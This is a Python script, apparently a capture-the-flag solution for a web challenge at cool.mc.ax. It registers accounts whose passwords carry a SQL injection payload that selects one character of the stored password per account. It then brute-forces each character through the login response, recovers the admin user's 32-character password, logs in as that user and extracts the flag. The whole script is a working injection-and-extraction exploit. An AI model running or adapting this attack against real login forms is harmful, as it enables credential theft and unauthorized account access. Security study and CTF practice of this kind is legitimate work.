import requests
import re

s = requests.Session()


def register(username, password):
    req = {'username': username, 'password': password}
    page = s.post('https://cool.mc.ax/register', data=req)

    if 'You are logged in!' not in page.text:
        print(f'failed to register username: {username}')
        print(page.text)
        exit(1)


def logout():
    s.get('https://cool.mc.ax/logout')


def login(username, password):
    logout()
    req = {'username': username, 'password': password}
    page = s.post('https://cool.mc.ax/', data=req)
    return 'You are logged in!' in page.text


def make_username(user):
    username = 'blahblahblah' + str(user)
    return username.replace('0', 'X')


def bruteforce_char(i):
    pswd = f"'||(SELECT substr(password,{i+1},1) FROM users));--"
    register(make_username(i), pswd)

    allowed_characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
    for c in allowed_characters:
        success = login(make_username(i), c)
        if success:
            print(c)
            return c

    print(f"ERROR: UNABLE TO BRUTEFORCE CHARACTER AT INDEX {i}")
    exit(1)


def main():
    computed_pswd = ''

    for i in range(32):
        computed_pswd += bruteforce_char(i)

    print(f"password: {computed_pswd}")

    req = {'username': 'ginkoid', 'password': computed_pswd}
    page = s.post('https://cool.mc.ax/', data=req)
    print(re.findall("flag\{[ -z|~]+\}", page.text)[0])


main()
